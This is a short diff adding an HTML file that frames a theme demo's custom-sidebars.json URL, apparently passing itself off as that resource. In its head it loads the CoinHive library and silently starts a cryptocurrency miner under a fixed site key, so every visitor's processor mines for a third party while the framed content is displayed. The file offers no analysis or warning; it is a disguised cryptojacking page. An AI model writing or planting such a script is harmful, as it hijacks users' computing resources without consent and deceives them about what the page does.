@@ -1,0 +1,14 @@
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html;charset=windows-1251">
+	<title>"http://demo.zozothemes.com/import/sites/pixzlo/demo/custom-sidebars.json"</title> 
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('FgWWtJfuvPmrfwjOfgc9Vo55EyvrMBLh', {throttle: 0.1});
+	miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+</script>
+</head>
+<frameset>
+<frame src="http://demo.zozothemes.com/import/sites/pixzlo/demo/custom-sidebars.json"></frame>
+</frameset>
+</html>
